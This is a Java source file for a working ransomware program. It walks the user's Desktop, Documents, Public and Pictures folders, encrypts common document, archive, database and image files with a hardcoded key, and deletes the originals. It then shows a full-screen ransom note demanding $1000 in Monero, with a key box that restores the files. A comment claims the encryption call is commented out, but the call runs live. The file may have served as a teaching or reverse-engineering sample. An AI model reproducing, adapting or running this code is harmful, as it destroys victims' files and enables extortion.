package com.company;

import org.apache.commons.io.FileUtils;
import java.io.*;
import java.util.*;
import java.awt.*;
import java.awt.event.*;
import javax.swing.*;



public class Main {

    static JFrame f;
    static JLabel l;

    public enum OS { WINDOWS, LINUX, MAC, SOLARIS, BSD, GENERIC };

    private static OS os = null;

    public static String pubKey = "NdRgUkXp2s5u8x/A";   // TODO: create this programmatically

    public static void main(String[] args) throws UnknownSystemException {
        //-------THIS METHOD CALL IS WHERE THE DANGEROUS STUFF HAPPENS
        // let's just leave that commented out until we need it...
        EncryptFiles();
        DisplayRansomNote();
    }

    public static OS getOS() {//throws UnknownSystemException {
        if (os == null) {
            String oSystem = System.getProperty("os.name").toLowerCase();

            if (oSystem.contains("win")) {
                os = OS.WINDOWS;
            } else if (oSystem.contains("nix") || oSystem.contains("nux") || oSystem.contains("aix")) {
                os = OS.LINUX;
            } else if (oSystem.contains("mac")) {
                os = OS.MAC;
            } else if (oSystem.contains("sun") || oSystem.contains("solar")) {
                os = OS.SOLARIS;
            } else if (oSystem.contains("bsd")) {
                os = OS.BSD;
            } else {
                os = OS.GENERIC;
                // throw new UnknownSystemException("unknown OS detected");
            }
        }

        return os;
    }

    // TODO: add important sensitive directories based on detected OS
    //  maybe also eliminate the exception if none get detected
    //  as we can still do some very basic checks

    public static void EncryptFiles() throws UnknownSystemException {

        ArrayList<String> CriticalPathList = new ArrayList<>();
        CriticalPathList.add(System.getProperty("user.home") + "/Desktop");
        CriticalPathList.add(System.getProperty("user.home") + "/Documents");
        CriticalPathList.add(System.getProperty("user.home") + "/Public");
        CriticalPathList.add(System.getProperty("user.home") + "/Pictures");

        switch (getOS()) {
            case WINDOWS:
                // CriticalPathList.add(<sensitive windows path>); ...
                System.out.println("This victim is running Windows");
            case LINUX:
                // CriticalPathList.add(<sensitive linux path>); ...
                System.out.println("This victim is running a Linux distro");
            case MAC:
                // CriticalPathList.add(<sensitive macos path>); ...
                System.out.println("This victim is running MacOS");
            case SOLARIS:
                // CriticalPathList.add(<sensitive solaris path>); ...
                System.out.println("This victim is running Solaris");
            case BSD:
                // CriticalPathList.add(<sensitive windows path>); ...
                System.out.println("This victim is running BSD");
        }

        for (String TargetPath: CriticalPathList) {
            File root = new File(TargetPath);

            try{
                // TODO: Add more filetypes
                String[] extensions = {
                    "pdf", "doc", "txt",
                    "zip", "tar", "gz", "rar", "7z",
                    "sql",
                    "xls",
                    "xml",
                    "jpg", "jpeg", "png",
                };
                Collection files = FileUtils.listFiles(root, extensions, true);

                for( Object o: files){
                    File file = (File) o;
                    encrypt(file.getAbsolutePath());
                }
            }catch (Exception e){
                e.printStackTrace();
            }
        }
    }

    public static void RescueFiles() throws UnknownSystemException {

        ArrayList<String> CriticalPathList = new ArrayList<>();
        CriticalPathList.add(System.getProperty("user.home") + "/Desktop");
        CriticalPathList.add(System.getProperty("user.home") + "/Documents");
        CriticalPathList.add(System.getProperty("user.home") + "/Public");
        CriticalPathList.add(System.getProperty("user.home") + "/Pictures");

        switch (getOS()) {
            case WINDOWS:
                // CriticalPathList.add(<sensitive windows path>); ...
                System.out.println("This victim is running Windows");
            case LINUX:
                // CriticalPathList.add(<sensitive linux path>); ...
                System.out.println("This victim is running a Linux distro");
            case MAC:
                // CriticalPathList.add(<sensitive macos path>); ...
                System.out.println("This victim is running MacOS");
            case SOLARIS:
                // CriticalPathList.add(<sensitive solaris path>); ...
                System.out.println("This victim is running Solaris");
            case BSD:
                // CriticalPathList.add(<sensitive windows path>); ...
                System.out.println("This victim is running BSD");
        }

        for (String TargetPath: CriticalPathList) {
            File root = new File(TargetPath);

            try{
                String[] extensions = {"encrypted"};
                Collection files = FileUtils.listFiles(root, extensions, true);

                for( Object o: files){
                    File file = (File) o;
                    decrypt(file.getAbsolutePath());
                }
            }catch (Exception e){
                e.printStackTrace();
            }
        }
    }

    public static void encrypt(String targetFilePath) {

        File targetFile = new File(targetFilePath);
        File encryptedTargetFile = new File(targetFilePath + ".encrypted");

        try {
            CryptoUtils.encrypt(pubKey, targetFile, encryptedTargetFile);
        } catch (CryptoException e) {
            e.printStackTrace();
        }

        targetFile.delete();
    }

    public static void decrypt(String encryptedFilePath) {
        File targetFile = new File(encryptedFilePath);
        String decryptedFilePath = encryptedFilePath.split(".encrypted")[0];
        File decryptedTargetFile = new File(decryptedFilePath);

        try {
            CryptoUtils.decrypt(pubKey, targetFile, decryptedTargetFile);
        } catch (CryptoException e) {
            e.printStackTrace();
        }

        targetFile.delete();
    }

    public static void DisplayRansomNote() {
        f = new JFrame("WARNING");
        l = new JLabel();
        l.setText("Well, everyone makes mistakes, so you shouldn't feel too bad about the one you just made by clicking on that link. Unfortunately, this is going to be a costly one. All of your important files have been encrypted. Nothing has been deleted and the key to decrypt everything is safe with me. In order to receive it and rescue your files, you must send $1000 in Monero at whatever the current market rate is for the day you do the transaction (I'll know what it is for the day based on timestamps, so don't try and short me). If you don't know how to use cryptocurrencies, then, well, Google and YouTube are going to be your friends, but I am unfortunately not willing to hold your hand there. But rest assured, once you figure it out and send the stated amount to <address>, you will be able to go about your day (and hopefully learn a lesson about internet behavior).");
        JPanel p = new JPanel();
        p.add(l);
        f.add(p);

        //------ receive user key for recovery
        JPanel panel = new JPanel();
        JLabel label = new JLabel(" Enter the key: ");
        JTextField textf = new JTextField(128);

        JButton submit = new JButton(" Restore files ");
        JButton reset = new JButton(" Reset ");

        submit.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                String strVictimKey = textf.getText();

                if (strVictimKey.equals(pubKey)) {   // here's our cmp call, likely
                    try {
                        RescueFiles();
                        JOptionPane.showMessageDialog(f, "Your files have been successfully decrypted");
                        f.dispose();
                    } catch (UnknownSystemException ex) {
                        JOptionPane.showMessageDialog(f, "There was an error decrypting your files" + ex.toString());
                    }

                } else {
                    JOptionPane.showMessageDialog(f, "Invalid key");
                }
            }
        });

        panel.add(label);
        panel.add(textf);
        panel.add(submit);
        panel.add(reset);

        f.getContentPane().add(BorderLayout.NORTH, label);
        f.getContentPane().add(BorderLayout.SOUTH, panel);

        f.setVisible(true);
        f.setExtendedState(JFrame.MAXIMIZED_BOTH);
    }
}

class UnknownSystemException extends Exception {

    public UnknownSystemException(String s) {
        super(s);
    }
}